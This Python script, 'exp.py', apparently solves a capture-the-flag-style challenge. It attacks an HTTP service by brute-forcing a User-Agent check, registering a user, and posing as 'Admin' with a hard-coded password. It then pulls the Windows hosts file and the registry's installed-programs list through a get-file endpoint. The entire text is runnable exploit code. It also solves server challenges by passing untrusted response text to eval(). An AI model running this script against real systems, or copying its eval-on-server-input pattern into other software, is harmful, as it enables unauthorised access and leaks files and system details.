"""
Usage: python exp.py <ip> <port>
"""
import requests
from sys import argv 
import random
from pprint import pprint
import string
import base64
USER_AGENT  = "".join([random.choice(string.ascii_uppercase) for _ in range(2)])
ADMIN_PASS = "pwn"
if len(argv) < 3: 
    print("[-] fatel error: Usage python exp.py <ip> <port>")
    exit(-1)
ip = argv[1]
port = argv[2]
BASE_URL  = f"http://{ip}:{port}/"
CHALLENGE_URL  = f"{BASE_URL}get-challenge"
GET_FILE_URL = f"{BASE_URL}get-file"
HOST_FILE  = base64.urlsafe_b64encode("C:\\Windows\\System32\\Drivers\\etc\\hosts".encode()).decode()
PROGRAM_LIST_FILE  =    base64.urlsafe_b64encode("HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*".encode()).decode()
HEADERS = {"User-Agent" : USER_AGENT,
           "Machine-Id"  : "new_user",
           "Password" : "hello world",
           "Content-Length" : str(len(HOST_FILE))
           }

def get_challenge():
 result = requests.get(CHALLENGE_URL, headers=HEADERS)
 if result.status_code  != 200:
     print("[-] Was not able to receive the challenge")
 else:
     print("[+] got a challenge :) ")
     print(f"[+] Solved it :)\nChallenge: {result.text} = {eval(result.text)}")
     HEADERS["challenge"] = result.text
     HEADERS["challenge-solution"] = str(eval(result.text))


result = requests.get(BASE_URL,headers=HEADERS)
while result.status_code != 200:
    USER_AGENT  = "".join([random.choice(string.ascii_uppercase) for _ in range(2)])
    HEADERS["User-Agent"] = USER_AGENT
    result  = requests.get(BASE_URL, headers=HEADERS)
print("[+] pass the User-Agent check")
REGISTER_USER_URL = f"{BASE_URL}register"
result  = requests.get(REGISTER_USER_URL, headers=HEADERS)
if result.status_code != 200:
    print("[-] Was not able to register a user")
else:
    print(f"[+] Register a user , user name {HEADERS['Machine-Id']}")
    
HEADERS["Machine-Id"] = "Admin"
HEADERS["Password"] = ADMIN_PASS
get_challenge()

result = requests.get(GET_FILE_URL,headers=HEADERS,data=HOST_FILE)
if result.status_code != 200:
    print("[-] was not able to recive the host file :(")
else:
 
  print(base64.urlsafe_b64decode(result.text).decode())


HEADERS["Content-Length"] = str(len(PROGRAM_LIST_FILE))
get_challenge()
result = requests.get(GET_FILE_URL,headers=HEADERS,data=PROGRAM_LIST_FILE)
if result.status_code != 200:
    print("[+] Was not able to retrive the list of programs")
else:
    print(result.text)
